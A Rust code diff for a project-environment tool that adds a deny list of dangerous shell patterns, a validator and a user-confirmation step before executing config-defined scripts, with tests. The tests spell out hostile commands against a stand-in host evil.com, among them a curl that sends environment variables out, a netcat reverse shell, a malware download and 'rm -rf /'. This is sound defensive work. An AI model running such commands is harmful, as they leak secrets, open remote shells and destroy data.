@@ -7,6 +7,100 @@ use regex::Regex;
 use std::fs;
 use std::path::{Path, PathBuf};
 
+/// Information about a script to be executed, returned for user confirmation.
+#[derive(Debug, Clone)]
+pub struct ScriptInfo {
+    /// Script name as defined in config
+    pub name: String,
+    /// The shell command that will be executed
+    pub command: String,
+    /// Optional description from config
+    pub description: Option<String>,
+    /// Environment variables that will be set before execution
+    pub env_vars: HashMap<String, String>,
+    /// Path to the config file that defines this script
+    pub config_source: PathBuf,
+}
+
+/// Dangerous patterns that should never appear in script commands.
+///
+/// These patterns indicate potential command injection or exfiltration attempts
+/// that go beyond typical build/test scripts.
+const DANGEROUS_PATTERNS: &[(&str, &str)] = &[
+    ("curl", "Network requests can exfiltrate data"),
+    ("wget", "Network requests can exfiltrate data"),
+    ("nc ", "Netcat can open network connections"),
+    ("netcat", "Netcat can open network connections"),
+    ("ncat", "Netcat variant can open network connections"),
+    ("/dev/tcp", "Direct TCP connections can exfiltrate data"),
+    ("mkfifo", "Named pipes can be used for reverse shells"),
+    ("base64", "Encoding is often used to obfuscate malicious commands"),
+    ("eval ", "eval can execute arbitrary code"),
+    ("$(curl", "Command substitution with network request"),
+    ("`curl", "Backtick substitution with network request"),
+    ("chmod +s", "Setting SUID bit is a privilege escalation"),
+    ("chmod u+s", "Setting SUID bit is a privilege escalation"),
+    ("> /etc/", "Writing to system config directories"),
+    (">> /etc/", "Appending to system config directories"),
+    ("rm -rf /", "Recursive deletion of root filesystem"),
+    ("rm -rf /*", "Recursive deletion of root filesystem contents"),
+    ("dd if=", "Raw disk operations can destroy data"),
+    (":(){ :|:", "Fork bomb"),
+    ("sudo ", "Privilege escalation via sudo"),
+    ("doas ", "Privilege escalation via doas"),
+    ("su -", "Privilege escalation via su"),
+    ("ssh ", "SSH connections can be used for exfiltration"),
+    ("scp ", "SCP can exfiltrate files"),
+    ("rsync", "Rsync can exfiltrate files"),
+    ("crontab", "Cron modification can install persistence"),
+    ("systemctl", "Service management can install persistence"),
+    ("launchctl", "macOS service management can install persistence"),
+];
+
+/// Validates a script command for dangerous patterns.
+///
+/// # Errors
+///
+/// Returns an error if the command contains any known dangerous patterns.
+fn validate_script_command(command: &str) -> Result<()> {
+    let lower = command.to_lowercase();
+
+    for (pattern, reason) in DANGEROUS_PATTERNS {
+        if lower.contains(pattern) {
+            return Err(eyre!(
+                "Script command blocked for security reasons.\n\
+                 Dangerous pattern detected: '{}'\n\
+                 Reason: {}\n\
+                 Command: {}\n\n\
+                 If you trust this script, run it directly in your shell instead.",
+                pattern,
+                reason,
+                command
+            ));
+        }
+    }
+
+    // Check for excessively long commands (potential obfuscation)
+    if command.len() > 4096 {
+        return Err(eyre!(
+            "Script command blocked: command is suspiciously long ({} bytes).\n\
+             This may indicate obfuscated malicious code.\n\
+             If you trust this script, run it directly in your shell instead.",
+            command.len()
+        ));
+    }
+
+    // Check for null bytes (injection technique)
+    if command.contains('\0') {
+        return Err(eyre!(
+            "Script command blocked: command contains null bytes.\n\
+             This is a known injection technique."
+        ));
+    }
+
+    Ok(())
+}
+
 pub struct ProjectManager {
     config_dir: PathBuf,
     config: Option<ProjectConfig>,
@@ -232,14 +326,29 @@ impl ProjectManager {
 
     /// Run a project script
     ///
+    /// # Security
+    ///
+    /// Scripts are loaded from `.envx/config.yaml` and executed via a shell.
+    /// This method validates the script command against known dangerous patterns
+    /// and requires the caller to confirm execution. The `confirmed` parameter
+    /// must be set to `true` to actually execute the script — this ensures that
+    /// CLI callers display the command to the user and obtain consent before running.
+    ///
     /// # Errors
     ///
     /// This function will return an error if:
     /// - No project configuration is loaded
     /// - The specified script is not found in the configuration
+    /// - The script command fails security validation
+    /// - `confirmed` is false (returns script info for the caller to display)
     /// - Setting environment variables fails
     /// - The script execution fails
-    pub fn run_script(&self, script_name: &str, manager: &mut EnvVarManager) -> Result<()> {
+    pub fn run_script(
+        &self,
+        script_name: &str,
+        manager: &mut EnvVarManager,
+        confirmed: bool,
+    ) -> Result<ScriptInfo> {
         let config = self
             .config
             .as_ref()
@@ -250,6 +359,23 @@ impl ProjectManager {
             .get(script_name)
             .ok_or_else(|| color_eyre::eyre::eyre!("Script '{}' not found", script_name))?;
 
+        // Security: validate the script command before execution
+        validate_script_command(&script.run)?;
+
+        let info = ScriptInfo {
+            name: script_name.to_string(),
+            command: script.run.clone(),
+            description: script.description.clone(),
+            env_vars: script.env.clone(),
+            config_source: self.config_dir.clone(),
+        };
+
+        // If not confirmed, return the script info so the caller can display it
+        // and ask the user for confirmation before re-calling with confirmed=true
+        if !confirmed {
+            return Ok(info);
+        }
+
         // Apply script-specific environment variables
         for (name, value) in &script.env {
             manager.set(name, value, false)?;
@@ -258,15 +384,21 @@ impl ProjectManager {
         // Execute the script
         #[cfg(unix)]
         {
-            std::process::Command::new("sh").arg("-c").arg(&script.run).status()?;
+            std::process::Command::new("sh")
+                .arg("-c")
+                .arg(&script.run)
+                .status()?;
         }
 
         #[cfg(windows)]
         {
-            std::process::Command::new("cmd").arg("/C").arg(&script.run).status()?;
+            std::process::Command::new("cmd")
+                .arg("/C")
+                .arg(&script.run)
+                .status()?;
         }
 
-        Ok(())
+        Ok(info)
     }
 
     fn load_env_file(path: &Path, manager: &mut EnvVarManager) -> Result<()> {
@@ -665,7 +797,16 @@ mod tests {
 
         manager.config = Some(create_test_config());
 
-        let result = manager.run_script("test", &mut env_manager);
+        // First call without confirmation returns script info
+        let info = manager.run_script("test", &mut env_manager, false).unwrap();
+        assert_eq!(info.name, "test");
+        assert_eq!(info.command, "echo Running tests");
+
+        // Env should NOT be applied yet (confirmed=false)
+        assert!(env_manager.get("NODE_ENV").is_none());
+
+        // Second call with confirmation actually executes
+        let result = manager.run_script("test", &mut env_manager, true);
         assert!(result.is_ok());
 
         // Verify script environment was applied
@@ -679,7 +820,7 @@ mod tests {
 
         manager.config = Some(create_test_config());
 
-        let result = manager.run_script("nonexistent", &mut env_manager);
+        let result = manager.run_script("nonexistent", &mut env_manager, false);
         assert!(result.is_err());
         assert!(
             result
@@ -694,7 +835,7 @@ mod tests {
         let (manager, _temp) = create_test_project_manager();
         let mut env_manager = create_test_env_manager();
 
-        let result = manager.run_script("test", &mut env_manager);
+        let result = manager.run_script("test", &mut env_manager, false);
         assert!(result.is_err());
         assert!(
             result
@@ -702,6 +843,121 @@ mod tests {
                 .to_string()
                 .contains("No project configuration loaded")
         );
+    }
+
+    #[test]
+    fn test_run_script_blocks_dangerous_commands() {
+        let (mut manager, _temp) = create_test_project_manager();
+        let mut env_manager = create_test_env_manager();
+
+        let dangerous_commands = vec![
+            ("curl_test", "curl http://evil.com/steal?data=$(env)"),
+            ("wget_test", "wget http://evil.com/malware.sh"),
+            ("eval_test", "eval $(decode_payload)"),
+            ("sudo_test", "sudo rm -rf /"),
+            ("netcat_test", "nc -e /bin/sh evil.com 4444"),
+            ("ssh_test", "ssh attacker@evil.com"),
+            ("rm_root", "rm -rf /"),
+        ];
+
+        for (name, cmd) in dangerous_commands {
+            let mut config = create_test_config();
+            config.scripts.insert(
+                name.to_string(),
+                Script {
+                    description: Some("malicious".to_string()),
+                    run: cmd.to_string(),
+                    env: HashMap::new(),
+                },
+            );
+            manager.config = Some(config);
+
+            let result = manager.run_script(name, &mut env_manager, false);
+            assert!(
+                result.is_err(),
+                "Expected dangerous command to be blocked: {cmd}"
+            );
+            assert!(
+                result.unwrap_err().to_string().contains("blocked for security"),
+                "Expected security error for command: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_run_script_allows_safe_commands() {
+        let (mut manager, _temp) = create_test_project_manager();
+        let mut env_manager = create_test_env_manager();
+
+        let safe_commands = vec![
+            ("echo_test", "echo hello"),
+            ("npm_test", "npm test"),
+            ("cargo_test", "cargo test"),
+            ("make_test", "make build"),
+            ("python_test", "python -m pytest"),
+        ];
+
+        for (name, cmd) in safe_commands {
+            let mut config = create_test_config();
+            config.scripts.insert(
+                name.to_string(),
+                Script {
+                    description: Some("safe".to_string()),
+                    run: cmd.to_string(),
+                    env: HashMap::new(),
+                },
+            );
+            manager.config = Some(config);
+
+            // Should succeed (validation passes, not executing because confirmed=false)
+            let result = manager.run_script(name, &mut env_manager, false);
+            assert!(
+                result.is_ok(),
+                "Expected safe command to pass validation: {cmd}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_run_script_blocks_null_bytes() {
+        let (mut manager, _temp) = create_test_project_manager();
+        let mut env_manager = create_test_env_manager();
+
+        let mut config = create_test_config();
+        config.scripts.insert(
+            "null_injection".to_string(),
+            Script {
+                description: None,
+                run: "echo hello\0echo injected".to_string(),
+                env: HashMap::new(),
+            },
+        );
+        manager.config = Some(config);
+
+        let result = manager.run_script("null_injection", &mut env_manager, false);
+        assert!(result.is_err());
+        assert!(result.unwrap_err().to_string().contains("null bytes"));
+    }
+
+    #[test]
+    fn test_validate_script_command() {
+        // Safe commands
+        assert!(validate_script_command("echo hello").is_ok());
+        assert!(validate_script_command("npm run build").is_ok());
+        assert!(validate_script_command("cargo test -- --nocapture").is_ok());
+
+        // Dangerous commands
+        assert!(validate_script_command("curl http://evil.com").is_err());
+        assert!(validate_script_command("sudo apt install malware").is_err());
+        assert!(validate_script_command("rm -rf /").is_err());
+        assert!(validate_script_command("eval $(malicious)").is_err());
+
+        // Null byte injection
+        assert!(validate_script_command("safe\0malicious").is_err());
+
+        // Excessively long command
+        let long_cmd = "a".repeat(5000);
+        assert!(validate_script_command(&long_cmd).is_err());
     }
 
     #[test]
